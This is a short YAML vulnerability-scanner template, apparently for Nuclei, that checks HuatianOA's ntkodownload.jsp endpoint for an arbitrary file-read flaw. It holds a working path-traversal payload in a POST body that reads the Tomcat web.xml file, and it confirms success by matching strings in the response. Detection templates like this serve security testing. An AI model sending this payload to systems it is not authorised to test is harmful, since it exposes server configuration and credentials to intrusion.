id: huatianOA-ntkodownload-fileread

info:
  name: HuatianOA ntkodownload - Fileread
  author: Co5mos
  severity: critical

http:
  - method: POST
    path:
      - "{{BaseURL}}/OAapp/jsp/trace/ntkodownload.jsp"
    
    body: "filename=../../../Tomcat/webapps/OAapp/WEB-INF/web.xml"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        regex:
          - "java.util.HashMap"
          - "oa@"

      - type: status
        status:
          - 200